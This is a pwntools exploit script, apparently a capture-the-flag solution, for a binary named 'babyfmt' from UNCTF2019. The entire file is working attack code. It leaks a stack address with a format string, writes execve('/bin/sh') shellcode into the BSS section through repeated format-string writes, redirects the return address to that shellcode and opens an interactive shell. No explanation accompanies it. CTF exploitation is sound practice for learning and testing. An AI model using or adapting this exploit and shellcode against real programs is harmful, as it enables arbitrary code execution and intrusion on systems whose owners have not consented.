#!/usr/bin/env python
from pwn import *
p=process('./babyfmt')
#e = ELF("./babyfmt")
context.log_level = 'debug'
p.recvuntil("Welcome to UNCTF2019!")
p.recvuntil("printf is magic function!")
p.recvuntil('Please input your message:')
p.send('%p')
stack = int(p.recv(10),16)
ret_addr = stack + 0x5c
log.success('ret_addr >>>'+hex(ret_addr))
bss_addr = 0x0804b000-500
shellcode = [0x6850c031,0x68732f6e,0x622f2f68,0x50e38969,0x8953e289,0xcd0bb0e1,0x80]
for i in range(len(shellcode)):
    payload = fmtstr_payload(4,{(bss_addr+i*4):shellcode[i]})
    p.recvuntil("Please input your message:")
    p.send(payload)

raw_input("######")
payload1 = fmtstr_payload(4,{ret_addr:bss_addr})
p.recvuntil('Please input your message:')
p.send(payload1)

p.interactive()

